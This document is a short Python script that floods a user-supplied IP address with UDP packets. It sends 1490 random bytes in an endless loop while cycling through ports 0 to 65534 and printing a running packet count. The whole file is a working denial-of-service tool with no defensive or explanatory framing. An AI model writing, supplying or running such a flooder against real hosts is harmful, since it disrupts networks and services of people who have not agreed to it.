import socket;
from random import _urandom as urd;
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = urd(1490);
sent = 0;
ip = input("Ip address : ");
port = 0;
while True:
    sock.sendto(bytes, (ip,port));
    sent = sent+1;
    port = port+1;
    print("Sent %s packets to %s through port : %s"%(sent,ip,port));
    if port == 65534:
        port = 0;